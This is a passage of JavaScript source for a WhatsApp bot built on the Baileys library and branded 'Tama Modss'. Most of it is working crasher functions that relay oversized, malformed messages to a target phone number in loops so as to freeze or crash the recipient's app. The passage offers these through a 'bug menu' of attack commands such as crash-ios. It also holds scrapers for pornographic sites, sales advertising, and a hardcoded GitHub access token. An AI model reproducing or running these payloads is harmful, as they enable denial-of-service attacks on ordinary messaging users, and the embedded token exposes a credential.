        directPath: "/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc?ccb=11-4&oh=01_Q5Aa2gF45pi45HoFCrDj40WuGbf2qvyU6K3wubsygX5Y_AnGmw&oe=68E66184&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1757337021",
        jpegThumbnail: Buffer.from("...base64thumb...", "base64"),
        contextInfo: {
          isSampled: true,
          mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 1,
          newsletterName: "<Jz/awa> "
        },
        annotations: [
          {
            embeddedContent: { embeddedMusic },
            embeddedAction: true
          }
        ]
      }
    };
    const stickerMsg = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              mentionedJid: ["13135550002@s.whatsapp.net"],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593
            },
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: true,
            isAiSticker: true,
            isLottie: true
          }
        }
      }
    };
    const biji = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬",
                format: "DEFAULT"
              },
              contextInfo: { mentionedJid: mentionedList },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10".repeat(1045000),
                version: 3
              },
              entryPointConversionSource: "galaxy_message"
            }
          }
        }
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "999999")
      }
    );
   const sleep = (ms) => new Promise(res => setTimeout(res, ms));
   for (let i = 0; i < 20; i++){
    await client.relayMessage("status@broadcast", biji.message, {
      messageId: biji.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });
    await sleep(1000); 
    await client.relayMessage("status@broadcast", videoMsg, {
      messageId: "h-" + Date.now(),
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });
    await sleep(1000); 
    await client.relayMessage("status@broadcast", stickerMsg, {
      messageId: "s-" + Date.now(),
      statusJidList: [target]
    });
    await sleep(1000);
    }
    console.log(chalk.red(`Attack : ${target}`));
  } catch (err) {
    console.error("Error:", err);
  }
}

async function Fc(client, target) {
  await client.relayMessage(target, {
    interactiveMessage: {
      header: {
        hasMediaAttachment: true,
        jpegThumbnail: null,
        title: "𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬"
      },
      contextInfo: {
        participant: "13135550002@s.whatsapp.net",
        remoteJid: "status@broadcast",
        conversionSource: "Wa.me/stickerpack/d7y",
        conversionData: Math.random(),
        conversionDelaySeconds: 250000,
        isForwarded: true,
        forwardingScore: 250000,
        forwardNewsletterMessageInfo: {
          newsletterName: "𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬",
          newsletterJid: "1@newsletter",
          serverMessageId: 1
        },
        quotedAd: {
          caption: "𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬",
          advertiserName: "𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬",
          mediaType: "VIDEO"
        },
        placeKeyHolder: {
          fromMe: false,
          remoteJid: "0@s.whatsapp.net",
          id: "𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬"
        },
        expiration: -250000,
        ephemeralSettingTimestamp: 99999,
        ephemeralSharedSecret: 999,
        entryPointConversionSource: "Whatsapp.com",
        entryPointConversionApp: "Whatsapp.com",
        actionLink: {
          url: "Wa.me/stickerpack/d7y",
          buttonTitle: "𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬"
        }
      },
      nativeFlowMessage: {
        messageParamaJson: "{".repeat(9000),
        buttons: [{
          name: "payment_method",
          buttonParamsJson: JSON.stringify({
            currency: "XXX",
            payment_configuration: "",
            payment_type: "",
            total_amount: { value: 1000000, offset: 100 },
            reference_id: "4SWMDTS1PY4",
            type: "physical-goods",
            order: {
              status: "payment_requested",
              description: "",
              subtotal: { value: 0, offset: 100 },
              order_type: "PAYMENT_REQUEST",
              items: [{
                retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                name: "𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬",
                amount: { value: 1000000, offset: 100 },
                quantity: 1
              }]
            },
            additional_note: "𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬",
            native_payment_methods: [],
            share_payment_status: false
          })
        }],
        messageParamsJson: "}".repeat(9000)
      }
    }
  }, {
    participant: { jid: target }
  })
}

async function IOSV1(client, target) {
  try {
    const locationPayload = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "🩸⃟⃨〫⃰‣ ⁖𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬 ‣—" + "𖣂".repeat(15000),
      address: "🍧⃟༑⌁⃰𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬ཀ͜͡🍨" + "𖣂".repeat(5000),
      url: "https://www.byleeos" + "𖣂".repeat(25000) + ".my.id"
    }
    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage: locationPayload
        }
      }
    }, {})
    await client.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    })
  } catch (err) {
    console.error(err)
  }
}

async function IOSV2(client, target) {
  try {
    let locationPayload = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬" + "𖣂".repeat(15000),
      address: "🩸⃟༑⌁⃰𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬ཀ͜͡🦠" + "𖣂".repeat(5000),
      url: "https://www.byleeos" + "𖣂".repeat(25000) + ".my.id"
    }
    let msg1 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage: locationPayload
        }
      }
    }, {})
    let extendPayload = {
      extendedTextMessage: {
        text: "𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬",
        matchedText: "https://www.byleeos.my.id",
        description: "ios turbo - 1080".repeat(15000),
        title: "𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABt...",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    }
    let msg2 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          extendMsg: extendPayload
        }
      }
    }, {})
    await client.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    })
    await client.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    })
  } catch (err) {
    console.error(err)
  }
}

async function LocaX(target) {
    const generateLocationMessage = {
        viewOnceMessage: {
            message: {
                locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0,
                    name: "𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬",
                    address: "\u0000",
                    contextInfo: {
                        mentionedJid: [
                            target,
                            ...Array.from({ length: 1900 }, () =>
                                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ],
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent("status@broadcast", generateLocationMessage, {});

    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    }, {
        participant: target
    });
}
			
			if (m.message) {
				client.sendPresenceUpdate("recording", m.chat)
			}
		
				 
		async function hentaivid() {
return new Promise((resolve, reject) => {
const page = Math.floor(Math.random() * 1153)
axios.get('https://sfmcompile.club/page/'+page)
.then((data) => {
const $ = cheerio.load(data.data)
const hasil2 = []
$('#primary > div > div > ul > li > article').each(function (a, b) {
hasil2.push({
title: $(b).find('header > h2').text(),
link: $(b).find('header > h2 > a').attr('href'),
category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
type: $(b).find('source').attr('type') || 'image/jpeg',
video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
video_2: $(b).find('video > a').attr('href') || ''
})
})
resolve(hasil2)
})
})
}
		
async function searchVideo(query) {
  const url = `https://www.pornhub.com/video/search?search=${query}`;
  const response = await fetch(url);
  const html = await response.text();
  const $ = cheerio.load(html);
  
  const videoList = [];

  $('li[data-video-segment]').each((index, element) => {
    const $element = $(element);
    
    const link = $element.find('.title a').attr('href').trim();
    const title = $element.find('.title a').text().trim();
    const uploader = $element.find('.videoUploaderBlock a').text().trim();
    const views = $element.find('.views').text().trim();
    const duration = $element.find('.duration').text().trim();
    
    const videoData = {
      link: "https://www.pornhub.com" + link,
      title: title,
      uploader: uploader,
      views: views,
      duration: duration
    };
    
    videoList.push(videoData);
  });
  
  return videoList;
}

const example = async (teks) => {
const commander = ` *Usage Examples :*\n Ketik *${prefix+command}* ${teks}`
return reply(commander)
}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const reply = async (teks) => {
    return client.sendMessage(
        from,
        {
            contextInfo: {
                mentionedJid: [m.sender],
                externalAdReply: {
                    showAdAttribution: false,
                    renderLargerThumbnail: false,
                    title: `𝐃𝐚𝐧𝐧𝐲 𝐓𝐡𝐞 𝐊𝐢𝐧𝐠𝐬👑`,
                    body: `Haloo ${m.pushName} 👋🏻`,
                    previewType: "VIDEO",
                    thumbnail:  fs.readFileSync(`./source/media/Xyz.jpg`),
                    sourceUrl: `https://t.me/DannyExc`,
                    mediaUrl: `https://wa.me/6283132860356`
                }
            },
            text: teks
        },
        { quoted: loli }
    );
};
		
	let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
//client.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}
					
       const pluginsLoader = async (directory) => {
    let plugins = []
    const folders = fs.readdirSync(directory)
    folders.forEach(file => {
        const filePath = path.join(directory, file)
        if (filePath.endsWith(".js")) {
            try {
                const resolvedPath = require.resolve(filePath);
                if (require.cache[resolvedPath]) {
                    delete require.cache[resolvedPath]
                }
                const plugin = require(filePath)
                plugins.push(plugin)
            } catch (error) {
                console.log(`${filePath}:`, error)
            }
        }
    })
    return plugins
}

let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "../storage/lowdb/adapters/SyncMedata"))
const plug = { 
    client,
    isCreator,
    command,
    isCmd,
    qtext,
    loli,
    example,
    botNumber,    
    reply,
    isPremium,
    runtime,
    isOwner,
    from,    
    sleep,    
    isGroup
}
for (let plugin of plugins) {
    if (plugin.command.find(e => e == command.toLowerCase())) {
        pluginsDisable = false
        if (typeof plugin !== "function") return
        await plugin(m, plug)
    }
}
      if (!pluginsDisable) return   

//=============================//

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: client.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaction Open*\n\n*Danny S8X* Menyediakan Produk Dibawah Ini"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Danny S8X Menyediakan*

* Vps Digital Ocean
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

* *Channel Testimoni :*
https://whatsapp.com/channel/0029Vav8XGHL2ATznQc17P3A`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Danny S8X\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000

* Ram 2 GB : Rp2000

* Ram 3 GB : Rp3000

* Ram 4 GB : Rp4000

* Ram 5 GB : Rp5000

* Ram 6 GB : Rp6000

* Ram 7 GB : Rp7000

* Ram 8 GB : Rp8000

* Ram 9 GB : Rp9000

* Ram Unlimited : Rp10.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Danny S8X\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Vps Digital Ocean🌟*

_*Promo Vps Digital Ocean*_
* Ram 2 Core 2 Rp 30.000
* Ram 4 Core 2 Rp 40.000
* Ram 8 Core 4 Rp 50.000
* Ram 16 Core 4 Rp 60.000
𝘽𝙚𝙣𝙚𝙛𝙞𝙩
>̶>̶ Free Install Panel Pterodactyl
>̶>̶ Free Install Nodes+Wings
>̶>̶ Free Req domain
>̶>̶ Free Req Os, Versi, Region
>̶>̶ Full Akses Vps
>̶>̶ Masa Aktif 30 Hari Garansi 15 Hari
>̶>̶ Free Install Thema 8-16 Ram`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Danny S8X\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: loli})
await client.relayMessage(target, msgii.message, {messageId: msgii.key.id})
}

			
			
//============= [ COMMANDS ] ====================================================



switch (command) {
case 'infobot':{
const teks = `Owner Name : ${global.namadev}
Nama Bot : ${global.botname2}
Generasi : ${global.versi}
Baileys : @whiskeysockets/baileys
Type : Case

Developers : ${global.sosmed}
Bot Runtime : ${runtime(process.uptime())}
Vps Uptime : ${runtime(os.uptime())}
Waktu WITA : ${waktuWITA}
Waktu WIB : ${waktuWIB}
Waktu WIT : ${waktuWIT}
Prefix Used : Multi`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;
        
case "menu": case "buttonnew": {
  client.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
  client.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
let teks = `Здравствуйте, у меня есть Simple Bot, созданный TamaModss для многофункциональных устройств. 

╭─────( 𝐓𝐀𝐌𝐀 𝐌𝐎𝐃𝐒𝐒 )─────────╮
│友 ɴᴀᴍᴇ ʙᴏᴛ : Simple Bot
│友 ᴠᴇʀsɪᴏɴ : 1.0 GEN 2
│友 ᴛᴇʟᴇɢʀᴀᴍ ᴅᴇᴠᴇʟᴏᴘᴇʀ  : t.me/TamaModss
│友 ʀᴜɴᴛɪᴍᴇ : ${runtime(process.uptime())}
│友 ɪɴғᴏʀᴍᴀᴛɪᴏɴ : t.me/TamaModss 
╰──────────────────────────╯
(🔆)𝖲𝖾𝗅𝗅𝖾𝖼𝗍 𝖳𝗈 𝖡𝗎𝗍𝗍𝗈𝗇 𝖬𝖾𝗇𝗎
   ╰─→ 𝖯𝗂𝗅𝗂𝗁 𝖡𝗎𝗍𝗍𝗈𝗇 𝖬𝖾𝗇𝗎`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Semua Cmd',
title: 'All Menu',
description: 'Tampilkan Semua Fitur',
id: '.allmenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;

case "stokmenu": case "stockmenu": {    
const teks12 = `╔─═⊱ *「 \`STOCK\` 」* ─═⬣
║┏⊱
║⿻ addstokdo
║⿻ delstokdo
║⿻ liststokdo
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;

case "fiturnew": case "ftrnew": {    
const teks12 = `╔─═⊱ *「 \`FITUR NEW\` 」* ─═⬣
║┏⊱
║⿻ createweb
║⿻ delweb
║⿻ ambilkodeweb
║⿻ listweb
║⿻ createsc
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;

case "catatanmenu": case "catatmenu": {    
const teks12 = `╔─═⊱ *「 \`CATATAN\` 」* ─═⬣
║┏⊱
║⿻ addpendapatan
║⿻ delpendapatan
║⿻ listpendapatan
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;

case "bugmenu": case "attackmenu": {    
const teks12 = `╔─═⊱ *「 \`CRASHER\` 」* ─═⬣
║┏⊱
║⿻ force-bisnis
║⿻ delay-loca
║⿻ hades
║⿻ delay-mention
║⿻ crash-ios
║⿻ force-ori
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;

case 'adddb':
{
 if (!q) return reply('❌ Anda harus mengirimkan nomor yang akan ditambahkan ke database.');

 const phoneNumber = q.trim(); // Nomor yang ingin ditambahkan
 const phoneRegex = /^[0-9]+$/; // Hanya angka yang diperbolehkan
 if (!phoneRegex.test(phoneNumber)) {
   return reply('❌ Nomor tidak valid. Harap kirimkan hanya angka.');
 }

 const GITHUB_TOKEN = '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'; // Ganti dengan token GitHub Anda
 const REPO_OWNER = 'TamaXzz'; // Ganti dengan username GitHub Anda
